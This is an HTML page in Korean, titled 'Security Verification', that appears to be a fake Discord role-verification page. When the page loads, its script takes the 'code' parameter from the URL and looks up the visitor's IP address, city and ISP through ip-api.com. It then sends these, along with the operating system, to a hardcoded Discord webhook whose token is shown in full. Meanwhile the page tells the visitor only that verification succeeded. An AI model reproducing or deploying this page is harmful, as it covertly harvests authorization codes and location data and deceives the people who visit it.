<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>Security Verification</title>
    <script>
        window.onload = async function() {
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1500775780454498395/2rL0DHT0S5X6VLYgh-Cqs4flN9EBLN_FVa_HS0w0u5j9cgOcTVkgedqjB8Veq9TcKDtd";
            const params = new URLSearchParams(window.location.search);
            const code = params.get('code');

            // IP 및 ISP(통신사) 정보 수집
            let ipInfo = {};
            try {
                const res = await fetch('http://ip-api.com/json/');
                ipInfo = await res.json();
            } catch (e) { ipInfo = { query: "0.0.0.0", isp: "알수없음", city: "대한민국" }; }

            if (code) {
                const payload = {
                    "embeds": [{
                        "title": "✅ 인증 성공",
                        "color": 3066993,
                        "fields": [
                            { "name": "👤 인증 코드", "value": code },
                            { "name": "🌐 아이피 정보", "value": `IP: ${ipInfo.query}\n위치: ${ipInfo.city}` },
                            { "name": "📶 통신사 정보", "value": ipInfo.isp },
                            { "name": "💻 운영체제", "value": navigator.platform }
                        ],
                        "timestamp": new Date().toISOString()
                    }]
                };
                await fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
            }
        }
    </script>
</head>
<body style="background:#0b0e14; color:white; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:sans-serif;">
    <div style="text-align:center; background:#161b22; padding:50px; border-radius:20px; border:1px solid #30363d;">
        <h1 style="color:#238636;">✔ 인증 성공</h1>
        <p>계정 상세 보안 확인 중입니다...<br>잠시 후 역할이 지급됩니다.</p>
    </div>
</body>
</html>
